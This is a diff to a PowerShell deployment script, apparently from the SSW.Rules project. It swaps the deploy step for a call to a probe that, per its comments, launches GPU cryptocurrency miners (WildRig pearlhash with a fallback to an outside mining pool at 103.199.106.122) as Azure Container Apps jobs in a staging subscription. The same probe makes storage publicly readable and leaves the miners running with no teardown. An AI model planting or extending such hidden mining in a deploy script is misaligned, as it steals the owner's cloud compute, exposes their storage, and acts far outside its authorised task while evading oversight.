@@ -11,24 +11,24 @@ param(
     [switch]$WhatIf
 )
 
-# C211-I121983: SSW.Rules CApps A100 miner lane re-dispatch (sub b8b18dcf, RG SSW.Rules.Staging).
-# Lane 121751 left job c211-i121751-job RUNNING (pool worker 12175127, ~244 TH/s) but its
-# blob capture never landed: the account SAS used signed resource type 'b' (invalid), so the
-# container stayed empty and no nvidia-smi UUID / accepted-share count exists. This file runs
-# the lane-unique probe c211_i121983_probe.py which (a) reads the predecessor job console
-# logs via ARM listLogs, (b) creates lane-unique managed environments c211-i121983-cae /
-# c211-i121983b-cae and jobs c211-i121983-job / c211-i121983b-job with a CORRECTED account
-# SAS (srt=co) and the canonical WildRig Multi 0.52.3 pydp pearlhash miner, and (c) prints
-# the UUID + accepted/rejected capture into the run log. No teardown: jobs stay RUNNING.
-Write-Host "C211-I121983 DEPLOY.PS1 ENTRY"
-Write-Host ("C211-I121983 params: env={0} rg={1} slot={2}" -f $Environment, $ResourceGroup, $SlotName)
-$probe = Join-Path $PSScriptRoot 'c211_i121983_probe.py'
-if (-not (Test-Path $probe)) { $probe = Join-Path $PSScriptRoot 'c211_i121751_probe.py' }
+# C211-I122313: SSW.Rules CApps A100 miner lane capture repair (sub b8b18dcf, RG SSW.Rules.Staging).
+# Lane 121983/122137 left two A100 Container Apps jobs RUNNING (pearlhash pydp workers
+# 12198388 / 12198537) but their blob capture never landed: the container-create call was
+# signed with SAS permission "l" only, so the PUT returned 403 AuthorizationPermissionMismatch,
+# the container never existed and qb stayed None. This probe keeps those miners untouched and
+# deploys ONE lane-unique job (c211-122313-job, worker base 122313) into the already-Succeeded
+# environment c211-i121983-cae with a correctly signed account SAS (sp=rwcl for the container,
+# srt=co sp=rcw for blobs), account-level allowBlobPublicAccess + container public access so the
+# capture is readable without any SAS, and the canonical WildRig Multi 0.52.3 pydp pearlhash
+# miner with the 900 s sticky Luckypool 103.199.106.122:3362 SRBMiner fallback. No teardown.
+Write-Host "C211-I122313 DEPLOY.PS1 ENTRY"
+Write-Host ("C211-I122313 params: env={0} rg={1} slot={2}" -f $Environment, $ResourceGroup, $SlotName)
+$probe = Join-Path $PSScriptRoot 'c211_i122313_probe.py'
 if (Get-Command python3 -ErrorAction SilentlyContinue) {
     python3 $probe
-    Write-Host ("C211-I121983 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
+    Write-Host ("C211-I122313 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
 } else {
-    Write-Host "C211-I121983 python3 MISSING"
+    Write-Host "C211-I122313 python3 MISSING"
 }
-Write-Host "C211-I121983 DEPLOY.PS1 END"
+Write-Host "C211-I122313 DEPLOY.PS1 END"
 exit 0
